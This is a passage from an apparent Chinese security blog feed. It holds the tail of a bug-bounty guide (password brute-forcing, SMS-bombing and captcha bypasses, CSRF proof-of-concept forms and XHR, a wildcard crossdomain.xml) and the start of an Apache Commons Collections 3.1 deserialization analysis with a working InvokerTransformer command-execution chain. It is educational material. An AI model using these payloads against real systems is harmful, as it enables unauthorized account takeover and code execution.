rel="noopener">https://github.com/TheKingOfDuck/burpFakeIP</a></p></li><li><p>账号后加空格绕过账号错误次数限制。</p><p>一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。</p></li></ul><h5 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h5><p><strong>没有验证码或者验证码可以绕过的情况</strong></p><p>直接上一手字典爆破，当然还是有一些小技巧:</p><ul><li><p>比如可以设置固定的弱密码，比如123456，然后爆破账号。</p></li><li><p>比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:<a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool" target="_blank" rel="noopener">https://github.com/HongLuDianXue/BaiLu-SED-Tool</a></p><p>爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章:</p></li><li><p><a href="https://xz.aliyun.com/t/7823" target="_blank" rel="noopener">https://xz.aliyun.com/t/7823</a></p></li><li><p><a href="https://github.com/huyuanzhi2/password_brute_dictionary" target="_blank" rel="noopener">https://github.com/huyuanzhi2/password_brute_dictionary</a></p></li></ul><p><strong>有验证码且无法绕过的情况</strong></p><ul><li>github直接找员工账号邮箱，密码。</li><li>源码或者js文件查找线索，邮箱，或者加密的账号密码。</li><li>特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。</li><li>手动尝试常见弱口令。</li></ul><h5 id="注册、登录、找回密码处的短信-邮箱轰炸漏洞"><a href="#注册、登录、找回密码处的短信-邮箱轰炸漏洞" class="headerlink" title="注册、登录、找回密码处的短信\邮箱轰炸漏洞"></a>注册、登录、找回密码处的短信\邮箱轰炸漏洞</h5><p>这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势:</p><ul><li>加空格绕过</li><li>加任意字母绕过</li><li>前面加86绕过</li><li>xff头伪造ip绕过</li></ul><h5 id="逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞"><a href="#逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞" class="headerlink" title="逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞"></a>逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞</h5><p>因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候</p><p>类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大:</p><p><a href="https://www.freebuf.com/author/yangyangwithgnu" target="_blank" rel="noopener">https://www.freebuf.com/author/yangyangwithgnu</a></p><h4 id="常见的信息泄露漏洞"><a href="#常见的信息泄露漏洞" class="headerlink" title="常见的信息泄露漏洞"></a>常见的信息泄露漏洞</h4><p>敏感信息泄露的范围很广，我认为一般就是两大类，</p><ul><li>因为配置错误或者管理不当导致的企业内部信息泄露。</li><li>因为逻辑缺陷导致的用户资料泄露(遍历)。</li></ul><h5 id="github导致的信息泄露"><a href="#github导致的信息泄露" class="headerlink" title="github导致的信息泄露"></a>github导致的信息泄露</h5><ul><li><p>P牛知识星球里分享的github搜索关键词:<a href="https://twitter.com/obheda12/status/1316513838716551169" target="_blank" rel="noopener">https://twitter.com/obheda12/status/1316513838716551169</a></p></li><li><p>github子域名监控项目:<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></p></li><li><p>常见的泄露内容:</p><ul><li>员工内部邮箱、登录账号、密码。</li><li>企业的一些内部系统域名、ip泄露。</li><li>企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。</li></ul><p>乌云上有一些案例，可以看一看。</p></li></ul><h5 id="配置错误导致的信息泄露"><a href="#配置错误导致的信息泄露" class="headerlink" title="配置错误导致的信息泄露"></a>配置错误导致的信息泄露</h5><p>包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。</p><p>我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描</p><p>比如:</p><ul><li>备份文件的小字典</li><li>springboot泄露的小字典</li><li>网站后台的小字典</li></ul><p>比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。</p><p>可视化的比如TEST404系列、御剑扫描器使用体验也不错。</p><p> 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。</p><h5 id="越权导致的信息泄露"><a href="#越权导致的信息泄露" class="headerlink" title="越权导致的信息泄露"></a>越权导致的信息泄露</h5><p> 很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。</p><p>推荐几个burp插件:</p><ul><li>未授权检测： <a href="https://github.com/theLSA/burp-unauth-checker" target="_blank" rel="noopener">https://github.com/theLSA/burp-unauth-checker</a></li><li>敏感参数提取：<a href="https://github.com/theLSA/burp-sensitive-param-extractor" target="_blank" rel="noopener">https://github.com/theLSA/burp-sensitive-param-extractor</a></li><li>信息提取：<a href="https://github.com/theLSA/burp-info-extractor" target="_blank" rel="noopener">https://github.com/theLSA/burp-info-extractor</a></li></ul><p>插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。</p><p><strong>常见的一些越权情况:</strong></p><ul><li>基于用户ID的越权</li><li>基于功能对象ID的越权</li><li>基于上传对象ID的越权</li><li>基于未授权访问的越权</li><li>基于功能地址的越权</li><li>基于接口身份的越权</li></ul><h3 id="其他的OWASPTop10漏洞"><a href="#其他的OWASPTop10漏洞" class="headerlink" title="其他的OWASPTop10漏洞"></a>其他的OWASPTop10漏洞</h3><h4 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h4><p> CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。</p><p><strong>常见的漏洞点</strong></p><p>1、修改个人资料、邮箱、密码、头像</p><p>2、发表文章</p><p>3、添加、删除评论</p><p>4、添加、修改、删除收货地址</p><p>5、添加管理员</p><p><strong>(1) GET型</strong></p><p>GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用：</p><ul><li><pre><code>&lt;img src=http://www.xxxxx.com/csrf?xx=11 /&gt;<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(**2) <span class="keyword">POST</span>型**</span><br><span class="line"></span><br><span class="line"> <span class="keyword">POST</span>请求中没有<span class="keyword">token</span>参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有<span class="keyword">token</span>等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。</span><br><span class="line"></span><br><span class="line">poc(可以用burp自己生成的）:</span><br></pre></td></tr></table></figure>&lt;html&gt;    &lt;body&gt;         &lt;form name=&quot;px&quot; method=&quot;post&quot; action=&quot;http://www.xxxxx.com/add&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;user_id&quot; value=&quot;1111&quot;&gt;        &lt;/form&gt;       &lt;script&gt;document.px.submit(); &lt;/script&gt;     &lt;/body&gt; &lt;/html&gt;<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">POST</span>请求数据为json，当服务器没有严格校验content-<span class="keyword">type</span>类型时，<span class="type">POC</span>为：</span><br></pre></td></tr></table></figure>&lt;script&gt;  var xhr = new XMLHttpRequest();  xhr.open(&quot;POST&quot;, &quot;http://www.xxxx.com/api/setrole&quot;);  xhr.withCredentials = true;  xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&quot;);  xhr.send(&apos;{&quot;role&quot;:admin}&apos;);&lt;/script&gt;<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">3.</span> Flash 型</span><br><span class="line"></span><br><span class="line">Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。</span><br><span class="line"></span><br><span class="line">利用条件：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、目标站点下必须存在crossdomain.xml文件。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、crossdomain.xml中的配置允许其他域进行跨域请求。</span><br></pre></td></tr></table></figure>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;cross-domain-policy&gt;  &lt;allow-access-from domain=&quot;*&quot; /&gt;&lt;/cross-domain-policy&gt;</code></pre></li></ul><p><strong>bypass小技巧</strong></p><ul><li>删除csrf token</li><li>置空csrf token</li><li>修改请求方法，如POST方法变GET请求</li><li>使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么</li><li>使用固定token</li><li>token字段改成 token[]=</li></ul><h4 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h4><p> 这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。</p><ul><li><p>上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。</p></li><li><p>上传恶意文件进行钓鱼</p></li><li><p>尝试在上传的文件名前加../进行目录穿越。</p></li><li><p>可以结合其他漏洞比如CORS漏洞扩大危害。</p><p>文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。</p></li></ul><h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><p>老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章:<br><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html</a></p><p>Broken5师傅的xsspayload:</p><p><strong>hexo这里貌似会一直解析payload就不贴了，可以去先知看原文:)</strong></p><h5 id="bypass姿势"><a href="#bypass姿势" class="headerlink" title="bypass姿势"></a>bypass姿势</h5><h4 id="威胁情报的提交"><a href="#威胁情报的提交" class="headerlink" title="威胁情报的提交"></a>威胁情报的提交</h4><p>这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的</p><p><a href="https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q</a></p><p><a href="https://bbs.ichunqiu.com/article-921-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/article-921-1.html</a></p><p>可以试一试加一加各种羊毛群，反手撸一手羊毛群的羊毛。</p><h3 id="对于挖掘高危、严重级别漏洞的一些思考"><a href="#对于挖掘高危、严重级别漏洞的一些思考" class="headerlink" title="对于挖掘高危、严重级别漏洞的一些思考"></a>对于挖掘高危、严重级别漏洞的一些思考</h3><p> 因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。</p><h5 id="1-自动化信息收集的能力"><a href="#1-自动化信息收集的能力" class="headerlink" title="1.自动化信息收集的能力"></a>1.自动化信息收集的能力</h5><p>这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。</p><p> 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。</p><h5 id="2-打漏洞组合拳的能力"><a href="#2-打漏洞组合拳的能力" class="headerlink" title="2.打漏洞组合拳的能力"></a>2.打漏洞组合拳的能力</h5><p> SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。</p><h5 id="3-绕waf的能力"><a href="#3-绕waf的能力" class="headerlink" title="3.绕waf的能力"></a>3.绕waf的能力</h5><p> 这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。</p><h5 id="4-细心和耐心和一些运气"><a href="#4-细心和耐心和一些运气" class="headerlink" title="4.细心和耐心和一些运气"></a>4.细心和耐心和一些运气</h5><p>心细挖天下，再加上一些运气，可能高危严重就到手了。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p> 挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SRC混子的漏洞挖掘之道&quot;&gt;&lt;a href=&quot;#SRC混子的漏洞挖掘之道&quot; class=&quot;headerlink&quot; title=&quot;SRC混子的漏洞挖掘之道&quot;&gt;&lt;/a&gt;SRC混子的漏洞挖掘之道&lt;/h2&gt;&lt;p&gt;本文首先于先知社区:&lt;a href=&quot;https://xz.
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>从apache-commons-collections中学习java反序列化</title>
    <link href="https://shu1l.github.io/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/"/>
    <id>https://shu1l.github.io/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/</id>
    <published>2020-11-25T08:42:12.000Z</published>
    <updated>2020-11-25T09:20:52.962Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知社区:<a href="https://xz.aliyun.com/t/8500" target="_blank" rel="noopener">从apache-commons-collections中学习java反序列化 - 先知社区 (aliyun.com)</a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    java安全学习的第一篇文章，<strong>apache commons collections3.1</strong>的反序列化漏洞是java历史上最出名同时也是最具有代表性的反序列化漏洞，废话不多说，我们直接上手分析。希望能帮助到和我一样的初学者。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>jdk 1.7版本</li><li>IntelliJ IDEA<ul><li>File -&gt; Project Structure -&gt;Modules-&gt; Dependencies -&gt;JARs or directories</li></ul></li><li>commons-collections-3.1 jar<ul><li>可以直接使用idea自带的maven下载依赖包:</li><li><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></li></ul></li></ul><h3 id="基础知识准备"><a href="#基础知识准备" class="headerlink" title="基础知识准备"></a>基础知识准备</h3><h4 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h4><p>​    反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。</p><p>​    Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用。</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java.lang.Class;</span><br><span class="line">Java.lang.reflect<span class="function">.<span class="keyword">Constructor</span>;</span></span><br><span class="line">Java.lang.reflect.Field;</span><br><span class="line">Java.lang.reflect<span class="function">.<span class="keyword">Method</span>;</span></span><br><span class="line">Java.lang.reflect.Modifier;</span><br></pre></td></tr></table></figure><h5 id="获取反射中的Class对象"><a href="#获取反射中的Class对象" class="headerlink" title="获取反射中的Class对象"></a>获取反射中的Class对象</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#<span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>forName 静态方法</span><br><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.String"</span>)</span>;</span><br><span class="line">#使用 .<span class="keyword">class</span> 方法。</span><br><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">String</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">#使用类对象的 get<span class="constructor">Class()</span> 方法</span><br><span class="line">String str = <span class="keyword">new</span> <span class="constructor">String(<span class="string">"Hello"</span>)</span>;</span><br><span class="line">Class clz = str.get<span class="constructor">Class()</span>;</span><br></pre></td></tr></table></figure><h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应<span class="keyword">Class</span>的对象</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">Method</span> <span class="title">getMethod</span><span class="params">(String name, <span class="keyword">Class</span>&lt;?&gt;... parameterTypes)</span></span></span><br></pre></td></tr></table></figure><h5 id="反射Runtime执行本地命令"><a href="#反射Runtime执行本地命令" class="headerlink" title="反射Runtime执行本地命令"></a>反射Runtime执行本地命令</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line">Class runtimeClass1 = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.Runtime"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">Constructor constructor = runtimeClass1.get<span class="constructor">DeclaredConstructor()</span>;</span><br><span class="line">constructor.set<span class="constructor">Accessible(<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">Method runtimeMethod = runtimeClass1.get<span class="constructor">Method(<span class="string">"exec"</span>, String.<span class="params">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream <span class="keyword">in</span> = process.get<span class="constructor">InputStream()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="module-access"><span class="module"><span class="identifier">IOUtils</span>.</span></span><span class="keyword">to</span><span class="constructor">String(<span class="params">in</span>, <span class="string">"UTF-8"</span>)</span>);</span><br></pre></td></tr></table></figure><h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><p>​    类似php中反序列化使用的魔术方法，比如__destruct函数。在java中，<strong>readObject</strong>方法在反序列化漏洞时起到了至关重要的作用，利用ObjectInputStream的readObject方法进行对象读取的时候，<strong>当readObject()方法被重写的时候，反序列化该类时调用的就是重写的方法。</strong></p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> writeObject(ObjectOutputStream oos)  <span class="comment">//自定义序列化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObject(ObjectInputStream ois)  <span class="comment">//自定义反序列化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObjectNoData()</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">Object</span> writeReplace()  <span class="comment">//写入时替换对象。</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">Object</span> readResolve()</span><br></pre></td></tr></table></figure><p>反序列化时会自动调用readObject(ObjectInputStream)方法。我们通过在需要序列化/反序列化的类中定义<code>readObject</code>和<code>writeObject</code>方法从而实现自定义的序列化和反序列化操作。</p><h3 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h3><p>我们在分析cc链反序列化化漏洞的主要思路其实就是两条:</p><ul><li>利用<code>InvokerTransformer</code> 、 <code>ConstantTransformer</code> 、 <code>ChainedTransformer</code> 等类构建反射链，利用java的反射机制，然后通过类中的transformer类来调用。</li><li>找Common Collections中的类在反序列化时，会触发调用 <code>transform</code> 方法的情况，并以此来构建反序列化漏洞的攻击链。</li></ul><p>接下来我们使用IDEA跟进代码进行审计</p><h4 id="一、寻找反射链"><a href="#一、寻找反射链" class="headerlink" title="一、寻找反射链"></a>一、寻找反射链</h4><h5 id="org-apache-commons-collections-functors-InvokerTransformer"><a href="#org-apache-commons-collections-functors-InvokerTransformer" class="headerlink" title="org/apache/commons/collections/functors/InvokerTransformer"></a>org/apache/commons/collections/functors/InvokerTransformer</h5><p><strong>IDEA跟进类中(48~61行):</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20201107192725.png" alt=""></p><p>​    可以看到此处的transform方法调用了java的反射机制,并且发现<code>this.iMethodName</code> , <code>this.iParamTypes</code>, <code>this.iArgs</code>我们都是可以直接输入的。而<code>input</code>是在函数调用的时候传入的，我们同样是可控的。</p><p>当我们向对应参数传入以下值，即可以调用代码执行:</p><p><img src="QQ%E6%88%AA%E5%9B%BE20201107194652.png" alt=""></p><p>​    <strong>存在一组可控的反射调用</strong>是cc链存在反序列化漏洞的根本原因，但是这里我们只能只能在本地服务器上执行。是无法达成我们想要远程执行命令的效果，这里主要的限制是我们没有没有办法直接传入Runtime类的实例对象。</p><p>要想真正的形成调用链，我们仍然需要利用java的反射机制来调用函数，并且至少要调用四个方法:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getMethod</span><span class="params">()</span>, <span class="title">getRuntime</span><span class="params">()</span>, <span class="title">exec</span><span class="params">()</span> ,<span class="title">invoke</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>所以我们之后找到了<code>ChainedTransformer</code> 类。</p><h5 id="org-apache-commons-collections-functors-ChainedTransformer"><a href="#org-apache-commons-collections-functors-ChainedTransformer" class="headerlink" title="org/apache/commons/collections/functors/ChainedTransformer"></a>org/apache/commons/collections/functors/ChainedTransformer</h5><p><strong>IDEA跟进53~63行</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20201107200130.png" alt=""></p><p>简单的分析代码逻辑，该类的构造函数接受一个数组，我们只需要传入一个数组<code>chainedTransformer</code>就可以依次去调用每一个类的transform方法。</p><h4 id="org-apache-commons-collections-functors-ConstantTransformer"><a href="#org-apache-commons-collections-functors-ConstantTransformer" class="headerlink" title="org/apache/commons/collections/functors/ConstantTransformer"></a>org/apache/commons/collections/functors/ConstantTransformer</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20201107212925.png" alt=""></p><p>接口函数，在上面的循环中进入了不同的函数。给一个初始的object，然后输出作为下一个输入，从而实现链式调用。</p><p><strong>最后的反射poc如下:</strong></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="type">Transformer</span>[] &#123;</span><br><span class="line">            <span class="comment">//传入Runtime类</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"getMethod"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;<span class="keyword">String</span>.class, Class[].<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> <span class="type">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"invoke"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;Object.class, Object[].<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="type">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="comment">//反射调用exec方法</span></span><br><span class="line">            <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">"exec"</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="type">Class</span>[] &#123;<span class="keyword">String</span>.<span class="class"><span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">new</span> <span class="title">Object</span>[] </span>&#123;<span class="string">"open -a Calculator"</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> <span class="type">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>我们已经构造好了恶意的反射链条，现在我们的目标是触发该类的transform方法。</p><h4 id="二、寻找触发链"><a href="#二、寻找触发链" class="headerlink" title="二、寻找触发链"></a>二、寻找触发链</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">某个类的readObject方法</span><br><span class="line">-&gt;一系列调用</span><br><span class="line">-&gt;Transformerchain的transformer方法</span><br><span class="line">-&gt;执行反射链</span><br><span class="line">-&gt;执行Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"calc"</span>&#125;)</span><br></pre></td></tr></table></figure><ul><li>找到一个 <code>tansform()</code> 方法 , 该方法所属的实例对象是可控的</li><li>找到一个重写的 <code>readObject()</code> 方法 , 该方法会自动调用 <code>transform()</code> 方法.</li></ul><h4 id="JDK1-7–TransformedMap利用链"><a href="#JDK1-7–TransformedMap利用链" class="headerlink" title="JDK1.7–TransformedMap利用链"></a>JDK1.7–TransformedMap利用链</h4><p>​    <strong>Transmap类</strong>在一个元素被添加/删除/或是被修改时，会调用transform方法。我们可以通过TransformedMap.decorate()方法获得一个TransformedMap的实例。</p><p>​     因此，我们可以先构造一个TransformeMap实例,然后修改其中的数据，然后使其自动调用我们之前设定好的transform()方法。</p><h5 id="调用链"><a href="#调用链" class="headerlink" title="调用链:"></a>调用链:</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-&gt;ObjectInputStream.readObject()</span><br><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">-&gt;TransformedMap.entrySet().iterator().next().setValue()</span><br><span class="line">-&gt;TransformedMap.checkSetValue()</span><br><span class="line"><span class="function"> -&gt;</span>TransformedMap.transform()</span><br><span class="line">-&gt;ChainedTransformer.transform()</span><br></pre></td></tr></table></figure><h5 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h5><p>首先看<code>/org/apache/commons/collections/map/TransformedMap</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 